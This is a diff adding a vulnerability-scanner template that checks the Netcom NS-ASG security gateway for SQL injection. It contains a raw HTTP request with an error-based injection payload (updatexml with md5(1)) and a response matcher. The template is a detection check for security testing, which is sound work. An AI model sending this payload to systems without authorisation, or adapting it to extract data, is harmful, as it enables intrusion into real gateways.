@@ -1,0 +1,35 @@
+id: NSASG-Safety-Gateway-jsoncontent-sqli
+info:
+  name: NSASG-Safety-Gateway-jsoncontent-sqli
+  author: apple
+  severity: high
+  description: There is a SQL injection vulnerability in the Netcom NS-ASG application
+    security gateway. Attackers exploit vulnerabilities to cause harm to servers.
+  reference:
+    - https://github.com/flyyue2001/cve/blob/main/NS-ASG-sql-uploadmacbind.md
+    - https://github.com/hundanchen69/cve/blob/main/NS-ASG-sql-add_getlogin.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /protocol/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Sec-Fetch-Dest: empty
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Site: same-origin
+        Te: trailers
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 118
+
+        jsoncontent={"protocolType":"uploadmacbind","messagecontent":["1'and(updatexml(1,concat(0x7e,(select+md5(1))),1))='"]}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - c4ca4238a0b923820dcc509a6f75849
